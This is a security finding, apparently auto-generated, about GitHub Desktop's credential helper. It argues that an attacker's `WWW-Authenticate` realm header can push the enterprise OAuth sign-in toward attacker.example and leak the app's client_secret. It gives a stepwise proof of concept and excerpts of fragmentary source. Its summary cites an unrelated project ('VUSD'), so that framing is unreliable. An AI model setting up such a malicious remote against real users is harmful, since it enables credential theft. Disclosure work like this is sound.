## Title
Attacker-Controlled `WWW-Authenticate` Header Silently Redirects the OAuth Enterprise Sign-In Flow to a Malicious Host, Leaking Desktop's OAuth Secret - (File: `app/src/lib/trampoline/trampoline-credential-helper.ts`)

## Summary
The report describes VUSD relying on two overlapping, inconsistently-trusted governance mechanisms (`VanillaGovernable` and OpenZeppelin roles) for the same privileged decisions, one of which is "hidden" and easier to abuse. GitHub Desktop has a structurally analogous flaw in its credential-helper trampoline: two different mechanisms decide whether a remote host should be treated as a trusted GitHub endpoint. The primary, well-verified mechanism (`isGitHubHost`, a live HTTPS probe for the `x-github-request-id` header) is only used as a last resort. A secondary, weaker, attacker-influenceable mechanism — trusting the `WWW-Authenticate` realm string returned by the remote server — is checked first and can unilaterally classify an arbitrary attacker-controlled host as `'enterprise'`, causing Desktop to auto-populate and drive its GitHub Enterprise OAuth sign-in flow against that attacker host.

## Finding Description
`getEndpointKind` in [1](#0-0)  classifies the remote endpoint that Git is requesting credentials for. Before doing any network verification, it inspects `wwwauth[]` entries forwarded by Git from the remote server's HTTP response:

```
for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } ...
```

These `wwwauth[]` values come directly from the `WWW-Authenticate` header that the remote Git-over-HTTP server returns on a 401 response — a value fully controlled by whoever operates that remote (or a MITM/malicious proxy in the path). Only later, as a fallback, does the code perform the actual verified check `isGitHubHost(endpoint)` [2](#0-1) , which makes a real HTTPS request and checks for the `x-github-request-id` response header.

Because the header-trust path runs first, an attacker's Git server can force `getEndpointKind` to return `'enterprise'` for a URL that is not a GitHub host at all. In `getCredential` [3](#0-2) , once `endpointKind !== 'generic'` and no existing account matches the endpoint, Desktop calls `ui.promptForGitHubSignIn(endpoint)`.

`promptForGitHubSignIn` [4](#0-3)  then does:
```
this.dispatcher.beginEnterpriseSignIn(cb)
await this.dispatcher.setSignInEndpoint(origin)
```
directly passing the attacker's `origin` into `SignInStore.setEndpoint`, which advances straight to `SignInStep.Authentication` for that attacker endpoint [5](#0-4) . When the user clicks the (legitimate-looking) "Sign in using your browser" button, `authenticateWithBrowser` opens `getOAuthAuthorizationURL(endpoint, csrfToken)` in the system browser [6](#0-5) , and when the OAuth callback deep-link resolves, `resolveOAuthRequest` calls `requestOAuthToken(endpoint, action.code)` [7](#0-6) . `requestOAuthToken` performs a server-to-server POST containing Desktop's static `client_id`/`client_secret` to `${endpoint}/login/oauth/access_token` [8](#0-7)  — and `endpoint` here is the attacker's own host, entirely under their control.

Because the "sign-in" page the browser is redirected to is served by the attacker (there is no real GitHub Enterprise instance), the attacker can trivially script that page to redirect immediately back to Desktop's `x-github-client://oauth?code=...&state=...` deep link with the `state` value it captured from its own inbound request, satisfying the CSRF check in `resolveOAuthRequest`. Desktop then unconditionally issues the `client_secret`-bearing POST to the attacker's server.

## Impact Explanation
This lets an attacker who merely controls a Git-over-HTTP remote (or a proxy able to inject a `WWW-Authenticate` header on the path to one) trick GitHub Desktop into sending its embedded OAuth application `client_secret` to attacker infrastructure, and into completing what looks like a normal GitHub Enterprise sign-in against that infrastructure. This is credential/token exfiltration and unauthorized OAuth flow redirection against a host the attacker fully controls, matching the "credential/token exfiltration" and "unauthorized OAuth or account binding" impact categories. Unlike VUSD's issue (confusing but non-exploitable overlap), here the weaker "governance" path (header heuristic) is actually reachable and drives a security-sensitive network action with no cross-check against the stronger, already-implemented `isGitHubHost` verification.

## Likelihood Explanation
Triggering the weaker path only requires the victim to perform an ordinary Git operation (clone/fetch/push) against an attacker-controlled or attacker-proxied HTTP remote that requires authentication and answers with a crafted `WWW-Authenticate: Basic realm="GitHub"` header — no admin rights, local access, or unnatural steps are needed. The user-visible flow (a sign-in prompt) is indistinguishable from the legitimate GitHub Enterprise sign-in experience, so a user who is expecting to authenticate to access the repo has a natural reason to proceed and click "Sign in using your browser."

## Recommendation
Do not let the unauthenticated `WWW-Authenticate` header alone elevate an endpoint to `'enterprise'`/`'github.com'` trust. Either remove the `wwwauth[]` heuristic entirely, or always corroborate it with the existing `isGitHubHost` live verification (checking for `x-github-request-id`) before initiating any enterprise sign-in / OAuth flow. At minimum, `promptForGitHubSignIn`/`setSignInEndpoint` should refuse to auto-drive the OAuth flow for hosts that have not passed the verified `isGitHubHost` check, unifying the "is this really a GitHub endpoint" decision into a single, consistently verified code path rather than two independently-triggerable ones.

## Proof of Concept
1. Stand up an HTTP(S) server at `https://attacker.example/victim/repo.git` that behaves like a Git smart-HTTP remote but returns `401` with header `WWW-Authenticate: Basic realm="GitHub"` for any unauthenticated request, and serves a fake OAuth "authorize" page at `/login/oauth/authorize` that immediately redirects to `x-github-client://oauth?code=anything&state=<state from query>`.
2. Get the victim to clone or fetch `https://attacker.example/victim/repo.git` in GitHub Desktop (e.g., via a shared clone URL).
3. Git invokes the trampoline credential helper; `getEndpointKind` (`app/src/lib/trampoline/trampoline-credential-helper.ts:137-179`) sees `wwwauth[0]=Basic realm="GitHub"` and returns `'enterprise'` without any live verification.
4. `getCredential` finds no matching account and calls `ui.promptForGitHubSignIn('https://attacker.example')`, which calls `dispatcher.beginEnterpriseSignIn` + `dispatcher.setSignInEndpoint('https://attacker.example')` and shows the standard Sign In dialog.
5. Victim clicks "Sign in using your browser"; Desktop opens `https://attacker.example/login/oauth/authorize?client_id=<ID>&...` in the browser.
6. Attacker's page redirects the browser to `x-github-client://oauth?code=anything&state=<captured-state>`, which Desktop accepts (`resolveOAuthRequest`), and calls `requestOAuthToken('https://attacker.example', 'anything')`, POSTing `client_id`/`client_secret`/`code` to `https://attacker.example/login/oauth/access_token`.
7. Attacker's server logs Desktop's OAuth `client_secret` from the received POST body.

/** Implementation of the 'get' git credential helper command */
async function getCredential(cred: Credential, store: Store, token: string) {
  const ghCred = await getGitHubCredential(cred, store)

  if (ghCred) {
    return ghCred
  }

  const endpointKind = await getEndpointKind(cred, store)
  const accounts = await store.getAll()

  const endpoint = `${getCredentialUrl(cred)}`
  const apiEndpoint = getAPIEndpoint(endpoint)

  // If it appears as if the endpoint is a GitHub host and we don't have an
  // account for that endpoint then we should prompt the user to sign in.
  if (
    endpointKind !== 'generic' &&
    !accounts.some(a => a.endpoint === apiEndpoint)
  ) {
    if (getIsBackgroundTaskEnvironment(token)) {
      debug('background task environment, skipping prompt')
      return undefined
    }

    const account = await ui.promptForGitHubSignIn(endpoint)

    if (!account) {
      setHasRejectedCredentialsForEndpoint(token, endpoint)
    }

    return credWithAccount(cred, account)
  }

  // GitHub.com/GHE creds are only stored internally
  if (endpointKind !== 'generic') {
    return undefined
  }

  return useExternalCredentialHelper()
    ? getExternalCredential(cred, token)
    : getGenericCredential(cred, token)
}

const getEndpointKind = async (cred: Credential, store: Store) => {
  const credentialUrl = getCredentialUrl(cred)
  const endpoint = `${credentialUrl}`

  if (isGist(endpoint)) {
    return 'generic'
  }

  if (isDotCom(endpoint)) {
    return 'github.com'
  }

  if (isGHE(endpoint)) {
    return 'ghe.com'
  }

  // When Git attempts to authenticate with a host it captures any
  // WWW-Authenticate headers and forwards them to the credential helper. We
  // use them as a happy-path to determine if the host is a GitHub host without
  // having to resort to making a request ourselves.
  for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } else if (/realm="(GitLab|Gitea|Atlassian Bitbucket)"/.test(v)) {
        return 'generic'
      }
    }
  }

export async function requestOAuthToken(
  endpoint: string,
  code: string
): Promise<string | null> {
  try {
    const urlBase = getHTMLURL(endpoint)
    const response = await request(
      urlBase,
      null,
      'POST',
      'login/oauth/access_token',
      {
        client_id: ClientID,
        client_secret: ClientSecret,
        code: code,
      }
    )
    tryUpdateEndpointVersionFromResponse(endpoint, response)

    const result = await parsedResponse<IAPIAccessToken>(response)
    return result.access_token
  } catch (e) {
    log.warn(`requestOAuthToken: failed with endpoint ${endpoint}`, e)
    return null
  }
}

export async function isGitHubHost(url: string) {
  const { hostname } = new window.URL(url)

  const endpoint =
    hostname === 'github.com' || hostname === 'api.github.com'
      ? getDotComAPIEndpoint()
      : getEnterpriseAPIURL(url)

  if (isDotCom(endpoint) || isGHE(endpoint)) {
    return true
  }

  if (isKnownThirdPartyHost(hostname)) {
    return false
  }

  // github.example.com,
  if (/(^|\.)(github)\./.test(hostname)) {
    return true
  }

  // bitbucket.example.com, etc
  if (/(^|\.)(bitbucket|gitlab)\./.test(hostname)) {
    return false
  }

  if (getEndpointVersion(endpoint) !== null) {
    return true
  }

  // Add a unique identifier to the URL to make sure our certificate error
  // supression only catches this request
  const metaUrl = `${endpoint}/meta?ghd=${crypto.randomUUID()}`

  const ac = new AbortController()
  const timeoutId = setTimeout(() => ac.abort(), 2000)
  suppressCertificateErrorFor(metaUrl)
  try {
    const response = await fetch(metaUrl, {
      headers: { 'user-agent': getUserAgent() },
      signal: ac.signal,
      credentials: 'omit',
      method: 'HEAD',
      redirect: 'error',
    })

    tryUpdateEndpointVersionFromResponse(endpoint, response)

    return response.headers.has('x-github-request-id')

  public promptForGitHubSignIn(endpoint: string): Promise<Account | undefined> {
    return new Promise<Account | undefined>(async resolve => {

        await this.dispatcher.setSignInEndpoint(origin)

        type: PopupType.SignIn,
        isCredentialHelperSignIn: true,
        credentialHelperUrl: endpoint,
      })
    }).catch(e => {
      log.error(`Could not prompt for GitHub sign in`, e)
      return undefined
    })
  }

  public async resolveOAuthRequest(action: IOAuthAction) {
    if (!this.state || this.state.kind !== SignInStep.Authentication) {
      return
    }

    if (!this.state.oauthState) {
      return
    }

    if (this.state.oauthState.state !== action.state) {
      log.warn(
        'requestAuthenticatedUser was not called with valid OAuth state. This is likely due to a browser reloading the callback URL. Contact GitHub Support if you believe this is an error'
      )
      return
    }

    const { endpoint } = this.state
    const token = await requestOAuthToken(endpoint, action.code)

    if (token) {
      const account = await fetchUser(endpoint, token)
      this.state.oauthState.onAuthCompleted(account)
    } else {
      this.state.oauthState.onAuthError(
        new Error('Failed retrieving authenticated user')
      )
    }
  }

  public async setEndpoint(url: string): Promise<void> {
    const currentState = this.state

    if (
      currentState?.kind !== SignInStep.EndpointEntry &&
      currentState?.kind !== SignInStep.ExistingAccountWarning
    ) {
      const stepText = currentState ? currentState.kind : 'null'
      return fatalError(
        `Sign in step '${stepText}' not compatible with endpoint entry`
      )
    }

    /**
     * If the user enters a github.com url in the GitHub Enterprise sign-in
     * flow we'll redirect them to the GitHub.com sign-in flow.
     */
    if (/^(?:https:\/\/)?(?:api\.)?github\.com($|\/)/.test(url)) {
      this.beginDotComSignIn(currentState.resultCallback)
      return
    }

    this.setState({ ...currentState, loading: true })

    let validUrl: string
    try {
      validUrl = validateURL(url)
    } catch (e) {
      let error = e
      if (e.name === InvalidURLErrorName) {
        error = new Error(
          `The GitHub Enterprise instance address doesn't appear to be a valid URL. We're expecting something like https://example.ghe.com.`
        )
      } else if (e.name === InvalidProtocolErrorName) {
        error = new Error(
          'Unsupported protocol. Only https is supported when authenticating with GitHub Enterprise instances.'
        )
      }

      this.setState({ ...currentState, loading: false, error })
      return
    }

    const endpoint = getEnterpriseAPIURL(validUrl)

    const existingAccount = this.accounts.find(x => x.endpoint === endpoint)

    if (existingAccount) {
      this.setState({
        kind: SignInStep.ExistingAccountWarning,
        endpoint,
        existingAccount,
        error: null,
        loading: false,
        resultCallback: currentState.resultCallback,
      })
    } else {
      this.setState({
        kind: SignInStep.Authentication,
        endpoint,
        error: null,
        loading: false,
        resultCallback: currentState.resultCallback,
      })
    }
  }
